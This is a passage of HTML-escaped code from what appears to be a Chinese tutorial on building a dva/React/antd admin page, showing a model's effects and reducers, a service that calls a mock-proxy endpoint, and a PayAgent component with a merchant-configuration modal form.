      &lt;span class=&quot;kr&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;yield&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;queryParkManagerAgents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//queryParkManagerAgents 是定义的service 里面放出的可调用的方法&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;result Data  successfully&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;yield&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'updateStateQueryAgentList'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// (response.success) ? response.data : [],&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;callback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//进行回调&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;//updateStateQueryAgentList 是通过type 进行调用. 名字要相互对应，后面会讲为什么这么调用。&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;reducers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;updateStateQueryAgentList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;QueryAgentData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 这个QueryAgentData 需要提前定义在state里面&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;定义一个 &lt;code class=&quot;highlighter-rouge&quot;&gt;Service&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;kr&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'../utils/request2'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kr&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;queryParkManagerAgents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/proxy-get/queryAllAgent'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//其中这里面的 proxy-get 是通过 调用mock 的proxy 完成的。 也就是第一次配置的哪个 mock配置文件。&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'GET'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;最后编写一个 route （page）&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import React, &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;PureComponent&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; from &lt;span class=&quot;s1&quot;&gt;'react'&lt;/span&gt;;
import &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;connect&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; from &lt;span class=&quot;s1&quot;&gt;'dva'&lt;/span&gt;;
import &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
  Card,
  Button,
  Form,
  Input,
  Select,
  Modal,
  message,
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; from &lt;span class=&quot;s1&quot;&gt;'antd'&lt;/span&gt;;
import StandardTable from &lt;span class=&quot;s1&quot;&gt;'components/StandardTable'&lt;/span&gt;;
import PageHeaderLayout from &lt;span class=&quot;s1&quot;&gt;'../../layouts/PageHeaderLayout'&lt;/span&gt;;

import styles from &lt;span class=&quot;s1&quot;&gt;'./PayAgent.less'&lt;/span&gt;;

const &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Option&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Select;

const FormItem &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Form.Item;
//定义一个 Form
const CreateForm &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Form.create&lt;span class=&quot;o&quot;&gt;()(&lt;/span&gt;props &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
  const &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;modalVisible, form, handleAdd, handleModalVisible, optionChildrenDataTemp&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; props;
  const okHandle &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    form.validateFields&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;err, fieldsValue&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;err&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;;
      form.resetFields&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;;
      handleAdd&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fieldsValue&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;
    &lt;span class=&quot;o&quot;&gt;})&lt;/span&gt;;
  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
    &amp;lt;Modal
      &lt;span class=&quot;nv&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;新建配置&quot;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;visible&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;modalVisible&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;onOk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;okHandle&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;onCancel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt; handleModalVisible&lt;span class=&quot;o&quot;&gt;()}&lt;/span&gt;
    &amp;gt;
      &amp;lt;FormItem &lt;span class=&quot;nv&quot;&gt;labelCol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;wrapperCol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;商户代码&quot;&lt;/span&gt;&amp;gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;form.getFieldDecorator&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'mch_code'&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
          rules: &lt;span class=&quot;o&quot;&gt;[{&lt;/span&gt;required: &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;, message: &lt;span class=&quot;s1&quot;&gt;'Please input  mch_code...'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}]&lt;/span&gt;,
        &lt;span class=&quot;o&quot;&gt;})(&lt;/span&gt;&amp;lt;Input &lt;span class=&quot;nv&quot;&gt;placeholder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;目前有用&quot;&lt;/span&gt;/&amp;gt;&lt;span class=&quot;o&quot;&gt;)}&lt;/span&gt;
      &amp;lt;/FormItem&amp;gt;
      &amp;lt;FormItem &lt;span class=&quot;nv&quot;&gt;labelCol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;wrapperCol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;通道支付码&quot;&lt;/span&gt;&amp;gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;form.getFieldDecorator&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'mchp_code'&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
          rules: &lt;span class=&quot;o&quot;&gt;[{&lt;/span&gt;required: &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;, message: &lt;span class=&quot;s1&quot;&gt;'Please input  mchp_code...'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}]&lt;/span&gt;,
        &lt;span class=&quot;o&quot;&gt;})(&lt;/span&gt;&amp;lt;Input &lt;span class=&quot;nv&quot;&gt;placeholder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;请输入：通道支付码&quot;&lt;/span&gt;/&amp;gt;&lt;span class=&quot;o&quot;&gt;)}&lt;/span&gt;
      &amp;lt;/FormItem&amp;gt;
      &amp;lt;FormItem &lt;span class=&quot;nv&quot;&gt;labelCol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;wrapperCol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;商户名称&quot;&lt;/span&gt;&amp;gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;form.getFieldDecorator&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'business_name'&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
          rules: &lt;span class=&quot;o&quot;&gt;[{&lt;/span&gt;required: &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;, message: &lt;span class=&quot;s1&quot;&gt;'Please input  business_name...'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}]&lt;/span&gt;,
        &lt;span class=&quot;o&quot;&gt;})(&lt;/span&gt;&amp;lt;Input &lt;span class=&quot;nv&quot;&gt;placeholder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;请输入： 商户名称&quot;&lt;/span&gt;/&amp;gt;&lt;span class=&quot;o&quot;&gt;)}&lt;/span&gt;
      &amp;lt;/FormItem&amp;gt;
      &amp;lt;FormItem &lt;span class=&quot;nv&quot;&gt;labelCol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;wrapperCol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;描述信息&quot;&lt;/span&gt;&amp;gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;form.getFieldDecorator&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'mch_description'&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
          rules: &lt;span class=&quot;o&quot;&gt;[{&lt;/span&gt;required: &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;, message: &lt;span class=&quot;s1&quot;&gt;'Please input  certificate_file...'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}]&lt;/span&gt;,
        &lt;span class=&quot;o&quot;&gt;})(&lt;/span&gt;&amp;lt;Input &lt;span class=&quot;nv&quot;&gt;placeholder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;请输入：描述信息&quot;&lt;/span&gt;/&amp;gt;&lt;span class=&quot;o&quot;&gt;)}&lt;/span&gt;
      &amp;lt;/FormItem&amp;gt;
      &amp;lt;FormItem &lt;span class=&quot;nv&quot;&gt;labelCol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;wrapperCol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;商户ID&quot;&lt;/span&gt;&amp;gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;form.getFieldDecorator&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'mch_id'&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
          rules: &lt;span class=&quot;o&quot;&gt;[{&lt;/span&gt;required: &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;, message: &lt;span class=&quot;s1&quot;&gt;'Please input  mch_id...'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}]&lt;/span&gt;,
        &lt;span class=&quot;o&quot;&gt;})(&lt;/span&gt;&amp;lt;Input &lt;span class=&quot;nv&quot;&gt;placeholder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;请输入：商户ID&quot;&lt;/span&gt;/&amp;gt;&lt;span class=&quot;o&quot;&gt;)}&lt;/span&gt;
      &amp;lt;/FormItem&amp;gt;
      &amp;lt;FormItem &lt;span class=&quot;nv&quot;&gt;labelCol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;wrapperCol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;选择通道&quot;&lt;/span&gt;&amp;gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;form.getFieldDecorator&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'mchc_code'&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
          rules: &lt;span class=&quot;o&quot;&gt;[{&lt;/span&gt;required: &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;, message: &lt;span class=&quot;s1&quot;&gt;'Please selectd...'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}]&lt;/span&gt;,
        &lt;span class=&quot;o&quot;&gt;})(&lt;/span&gt;&amp;lt;Select
          // &lt;span class=&quot;nv&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;tags&quot;&lt;/span&gt;  // multiple  tags combobox
          &lt;span class=&quot;nv&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
          &lt;span class=&quot;nv&quot;&gt;placeholder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;不限&quot;&lt;/span&gt;
        &amp;gt;
          &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;optionChildrenDataTemp.map&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;item &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
            &amp;lt;Option &lt;span class=&quot;nv&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;item.channel_id&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;item.channel_id&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&amp;gt;
              &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;item.channel_name&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
            &amp;lt;/Option&amp;gt;
          &lt;span class=&quot;o&quot;&gt;))}&lt;/span&gt;
        &amp;lt;/Select&amp;gt;&lt;span class=&quot;o&quot;&gt;)}&lt;/span&gt;
      &amp;lt;/FormItem&amp;gt;
    &amp;lt;/Modal&amp;gt;
  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;
&lt;span class=&quot;o&quot;&gt;})&lt;/span&gt;;
// 连接model层的state数据，然后通过this.props.state : loading.models.名&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;namespace&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;访问model层的state数据
@connect&lt;span class=&quot;o&quot;&gt;(({&lt;/span&gt;parkingPayManager, loading&lt;span class=&quot;o&quot;&gt;})&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&quot;o&quot;&gt;({&lt;/span&gt;
  parkingPayManager, //获得整个 Model
  loading: loading.models.parkingPayManager, //   &lt;span class=&quot;nb&quot;&gt;true &lt;/span&gt;or &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;}))&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;default class PayAgent extends PureComponent &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
  state &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    selectedRows: &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;,
    isLoading: &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;,
    modalVisible: &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;,
    optionChildrenData: &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;,
  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;;

  componentWillMount&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    const &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;dispatch&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; this.props;
    dispatch&lt;span class=&quot;o&quot;&gt;({&lt;/span&gt;
      &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;'parkingPayManager/queryChannelList'&lt;/span&gt;, //通过dispatch调用这个请求。
      callback: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; //请求内的callback  可以做刷新动作等，
        message.success&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;select init success &quot;&lt;/span&gt; + e&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;
        this.setState&lt;span class=&quot;o&quot;&gt;({&lt;/span&gt;
          optionChildrenData: e,
        &lt;span class=&quot;o&quot;&gt;})&lt;/span&gt;;
      &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
    &lt;span class=&quot;o&quot;&gt;})&lt;/span&gt;;
    console.log&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;初始化 =&amp;gt; 下拉列表的数据&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;
  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

  componentDidMount&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    // componentWillMount -&amp;gt; render -&amp;gt;  componentDidMount  ..-&amp;gt; componentWillReceiveProps
    const &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;dispatch&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; this.props;
    // 触发action触发model层的state的初始化
    dispatch&lt;span class=&quot;o&quot;&gt;({&lt;/span&gt;
      &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;'parkingPayManager/queryAgentList'&lt;/span&gt;,
    &lt;span class=&quot;o&quot;&gt;})&lt;/span&gt;;
  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

  handleModalVisible &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; flag &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    this.setState&lt;span class=&quot;o&quot;&gt;({&lt;/span&gt;
      modalVisible: !!flag,
    &lt;span class=&quot;o&quot;&gt;})&lt;/span&gt;;
  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

  handleAdd &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; fields &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    const &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;dispatch&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; this.props;
    // 触发action触发model层的state的初始化
    dispatch&lt;span class=&quot;o&quot;&gt;({&lt;/span&gt;
      &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;'parkingPayManager/insertAgent'&lt;/span&gt;,
      payload: JSON.stringify&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fields&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,
      callback: &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        dispatch&lt;span class=&quot;o&quot;&gt;({&lt;/span&gt;
          &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;'parkingPayManager/queryAgentList'&lt;/span&gt;,
        &lt;span class=&quot;o&quot;&gt;})&lt;/span&gt;;
        this.setState&lt;span class=&quot;o&quot;&gt;({&lt;/span&gt;
          modalVisible: &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;, // 清除
        &lt;span class=&quot;o&quot;&gt;})&lt;/span&gt;;
        message.success&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'successfully '&lt;/span&gt; + JSON.stringify&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fields&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;;
      &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
    &lt;span class=&quot;o&quot;&gt;})&lt;/span&gt;;
  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;;

  render&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
